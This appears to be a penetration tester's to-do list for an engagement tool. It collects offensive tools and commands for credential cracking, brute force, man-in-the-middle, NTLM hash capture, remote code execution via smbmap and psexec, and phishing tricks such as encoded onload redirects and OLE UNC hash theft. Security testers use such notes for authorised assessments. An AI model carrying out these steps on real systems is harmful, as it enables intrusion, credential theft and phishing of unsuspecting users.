# To Do
- https://pypi.python.org/pypi/enumerator/0.1.4
- http://www.angusj.com/resourcehacker/ (Windows file generation for payloads?)
- https://technet.microsoft.com/en-us/library/cc766521(v=ws.10).aspx
- Forrest showed technique of attaching .htm file for phishing and having the link point to the .htm attachment (using cid:) and inside the .htm attachment it did onload to his real phishing site; the onload javascript was encoded as well to bypass stuff
- [ ] Verify nikto Trace option found using: nmap -p <<port>> --script http-methods <<ip>>
- [ ] Nmap web servers add to Website table
- [ ] Verify webdav using Nmap script: nmap --script http-iis-webdav-vuln.nse -p<<port>> <<ip>>
      *EXAMPLE: sudo nmap --script http-iis-webdav-vuln.nse -p443 23.25.152.148
      *RESULTS:
          Starting Nmap 6.46 ( http://nmap.org ) at 2016-02-26 08:31 CST
          Nmap scan report for 23-25-152-148-static.hfc.comcastbusiness.net (23.25.152.148)
          Host is up (0.097s latency).
          PORT    STATE SERVICE
          443/tcp open  https
          |_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>
          Nmap done: 1 IP address (1 host up) scanned in 471.58 seconds
- [ ] Search files for passwords, keys, etc: https://n0where.net/heuristics-file-system-secret-search-blueflower/
- [ ] Automated Recon collector - https://n0where.net/security-intelligence-collector-machinae/
- [ ] cracking hashes: https://n0where.net/from-responder-to-credentials-gladius/ (probably for IVA)
- [ ] AD query: https://n0where.net/ldap-based-active-directory-enumeration/ (IVA)
- [ ] Proxy (mitmproxy) - so can add as proxy to pass all traffic through to capture creds
- [ ] SSLstripping MiTM - https://n0where.net/transparent-ssl-tls-interception-sslsplit/
- [ ] W/ hash or creds use Ranger to automate escallation (https://n0where.net/command-line-attack-driven-penetration-testing-tool/)
- [ ] Creating DOCX Word document from python - https://n0where.net/automated-security-assessment-reporting-tool-guinevere/
- [ ] Create MP3 file to export data (https://n0where.net/transmit-data-through-sound-quiet/)
- [ ] Use this to generate payloads for phishing (etc) - https://n0where.net/customized-payload-generator-arcanus/
- [ ] recon-ng integration
- [ ] integrate https://datasploit.github.io/datasploit/apiGeneration/
- [ ] integrate PowerShell (for Kali & MAC) - https://github.com/PowerShell/PowerShell/blob/master/docs/building/linux.md

- [ ] gobuster (w/ fuzzDB list discovery dns alexa*)
    - gobuster DNS enumeration (run against external domains or internal) to find targets, etc
- [ ] powermeta - https://github.com/dafthack/PowerMeta.git
- [ ] use https://www.github.com/praetorian-inc/gladius for auto cracking responder! https://n0where.net/from-responder-to-credentials-gladius/
- [ ] pywinrm (allows to execute WMI on remote machines using passed creds)
- [ ] CME integration
- [ ] https://github.com/ElevenPaths/FOCA (file metadata for usernames, computer names, etc)

- [] OWA Bruteforce - auxiliary/scanner/http/owa_login (set RHOST: ex. webmail.company.com, set user_file and pass_file which should be Autumn2017, etc)
- [] Cisco VPN bruteforce: auxiliary/scanner/http/cisco_ssl_vpn (MUST BE CISCO VPN)

- impacket samrdump.py (get on all computers to dump user info - pass history, if expires, etc)
- impacket GetADUsers.py (ad users info - possible comment info)
- http://projectwoman.com/2014/10/calendar-wizard-in-word-2013-yes.html
- kerberoast - https://github.com/skelsec/PyKerberoast
- https://github.com/vanhauser-thc/thc-ipv6 (implement these tools)
- https://github.com/Neohapsis/suddensix
- iterate over password helps on website to generate passwords to try
- calendar invites for email filtering
- meeting request for email filtering
- sqlmap.py integration
- smtp enumeration: nmap --script=smtp-enum-users.nse <email_ip> -p <email_port>
- firemon: implement policy optimizer (validates PCI, etc compliance) & Risk analyzer (looks for firewall configuration risk
- DNS TXT records for unnecessary txt records (ones that might give away services used (like letsencrypt, aws, adfs, etc)
- DSN recursive query: nmap -sU -p53 --script=dns-recusion <dns_ip>
- look up ARIN Autonomous System Number to find all IPs associated w/ company
    - mxtoolbox quereies ARIN to get ASN
    - look at info at DNSSTUFF.com
    - look at robtex.com for its DNS stuff
-ike-scan -M -A id=vpn <ip>
- DHCP FORCERENEW
- https://github.com/shellster/LDAPPER
- https://github.com/aatlasis/chiron
- https://github.com/zbetcheckin/IPv6
- https://github.com/precociouss/pythonscripts/tree/master/wp_userenum
- https://github.com/codewatchorg/PowerSniper
- integrate bloodhound
- integrate Empire
- github.com/trustedsec/ridenum
- github.com/trustedsec/hatecrack
- github.com/trustedsec/simplyemail
- https://github.com/dafthack/mailsniper
- integrate git clone https://github.com/joaomatosf/jexboss.git (run against tomcat servers to check for vulns/exploits)
       - ex: python jexboss.py -host http://192.168.100.54:8080
- delldrac.py (use to check for default creds for dell idrac)
        -ex: python delldrac.py (modify so can pass IP/CIDR as argument)
- integrate bettercap (github bettercap/bettercap)                          
        - tutorial: https://danielmiessler.com/study/bettercap/#examples
- integrate https://github.com/byt3bl33d3r/MITMf
        - tutorial: https://charlesreid1.com/wiki/Man_in_the_Middle/WPAD
        - installation: https://github.com/byt3bl33d3r/MITMf/wiki/Installation
        - example vid: https://www.youtube.com/watch?v=_Iy7sdxDAQs
- integrate icebreaker from github
        - ex: python icebreaker.py -l <smb_no_signing_targets> -d <email address domain> -s dns --auto xterm
        - this will check for null sessions, null writes, ntmlrelaying w/ integration into Empire and Deathstar :)
- integrate unicorn
- integrate metasploit auxilliary/scanner/vnc/vnc_none_auth (to look for vnc w/o password)
- integrate https://github.com/ShawnDEvans/smbmap (installed as part of kali)
    - see null shares:
        - smbmap -H <target ip>
    - see drive listings & quick check if have rpc access
        - smbmap -H <target ip> -L
            - will see drives if have rpc access otherwise get 'rpc_s_access_denied'
        * Can specify -u <username> & -p <password or ntlm hash>
    - can execute remote code using -x cmd.exe

- MERGE ENGAGMENT DEVICES
  - EDIT Engagement Device not showing OS field

- integrate pip install pywerview (get group policy)

- When uploading to Engage, allow TE to update Engagement Status steps for tools that were run

- Telegram bot example to use bot key to communicate with Engage (Noah's idea)?

- https://github.com/skorov/ridrelay/blob/master/README.md
- https://github.com/sensepost/gowitness
- integrate https://github.com/Viralmaniar/Passhunt
- basestriker EMAIL relay https://thehackernews.com/2018/05/microsoft-safelinks-phishing.html?m=1

- integrate john-the-ripper
   - ./john --format=nt2 --wordlist=/Volumes/new\ bk/Wordlists/rockyou.txt ~/Downloads/hhfcu_ad_hashes.txt --rules:KoreLogicRulesAppendNumbers_and_Specials_Simple

- integrate https://github.com/GreatSCT/GreatSCT.git (payload generator - have to use this first to make sure is valid)
- integrate https://github.com/skelsec/PyKerberoast.git
- https://github.com/RUB-NDS/PRET
- https://github.com/shirosaidev/sharesniffer
- query https://www.expireddomains.net/domain-name-search/?o=statuscom&r=d&q=healthcare (for expired domains to possibly use)
- netscan shares (find anonymous smb shares)
- msf module for automating powerupsql (exploit/windows/mssql/mssql_link_crawler)
- https://www.kitploit.com/2018/07/msdat-microsoft-sql-database-attacking.html?m=1
- https://github.com/Nekmo/dirhunt
- ilobypass.py #tool for bypassing HP lights out (iLO) (noah has in /pentest github dir)
- amtbypass.py #tool for Intel AMT auth bypass (noah has in /pentest github dir)
- find open network share then automate scf attack (https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
- https://github.com/eladshamir/Internal-Monologue
    * wmiexec.py into a box... then from the cmd do like \your.kali.ip\share\internalmonologue.exe (smb share on kali box)
    * here's the exe location: https://github.com/eladshamir/Internal-Monologue/tree/master/InternalMonologueExe/bin/Release
    * actually... use psexec from your windows VM. Since that is an interactive prompt.
    * host the .exe on an smb share from your kali box. Then remotely execute it on the server. It will get you the NetNTLMv1 hash of each user logged in.
- git clone https://github.com/almandin/fuxploider.git $PENTESTDIR/fuxploider/
- OLE attachment that has UNC file (have responder running to try and capture hashes) - https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html

** Very interesting but seems (at least w/ some email filters checking SPF) that you can find email server to 'bounce'
your email through that is a allowed by their SPF record (like a separate Office 365 server)**

https://github.com/trimstray/the-book-of-secret-knowledge
https://github.com/Hack-with-Github/Awesome-Hacking
https://github.com/carpedm20/awesome-hacking
https://github.com/codingo/NoSQLMap
https://github.com/codingo/VHostScan
https://github.com/nebgnahz/awesome-iot-hacks
https://github.com/infosecn1nja/Red-Teaming-Toolkit
https://github.com/Zawadidone/webhacking

# creating graphs (network topology, etc)
https://towardsdatascience.com/getting-started-with-graph-analysis-in-python-with-pandas-and-networkx-5e2d2f82f18e

# For Internal to grab all Users from cisco IP phones
https://git.issgs.net/fkasler/phone_pharm